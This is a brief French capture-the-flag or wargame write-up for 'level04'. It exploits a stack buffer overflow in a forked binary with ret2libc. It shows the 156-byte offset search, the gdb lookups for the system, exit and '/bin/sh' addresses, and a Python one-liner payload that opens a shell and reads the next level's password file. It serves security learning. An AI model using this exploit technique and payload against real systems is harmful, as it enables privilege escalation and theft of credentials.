idée : dans le code nous avons un fork donc pour pouvoir récupérer les adresse dans gdb il faut set follow-fork-mode child. 
Puis il s’agit d’un simple overwrite de la return address avec la ret2libc

recherche de l’offset a la volee: 

Give me some shellcode, k
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb →156 overflow

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1999]
0x62626262 in ?? ()

recherche des address system exit bash in libc
(gdb) set follow-fork-mode child
(gdb) r
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) info proc map
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.

0xf7e6aed0 0xf7e5eb70 0xf7f897ec → 
'\xd0\xae\xe6\xf7' + '\x70\xeb\xe5\xf7' + '\xec\x97\xf8\xf7'

(python -c "print 'a' * 156 + '\xd0\xae\xe6\xf7' + '\x70\xeb\xe5\xf7' + '\xec\x97\xf8\xf7'"; cat) | ./level04
whoami
level05
cat /home/users/level05/.pass
